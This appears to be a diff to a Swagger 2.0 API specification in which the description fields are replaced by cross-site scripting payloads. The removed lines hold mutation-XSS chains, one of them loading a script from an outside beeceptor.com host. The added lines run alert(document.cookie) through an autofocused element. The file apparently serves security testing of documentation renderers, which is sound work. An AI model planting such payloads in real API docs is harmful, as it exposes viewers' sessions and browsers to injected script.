@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><x-x onfocus=alert(document.cookie) tabindex=0 autofocus><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=//mrvredteam.free.beeceptor.com/14.rs></script>">
+  description: <form><x-x onfocus=alert(document.cookie) tabindex=0 autofocus></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -26,7 +26,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <form><x-x onfocus=alert(document.cookie) tabindex=0 autofocus></form>
 
           format: int64
           in: path
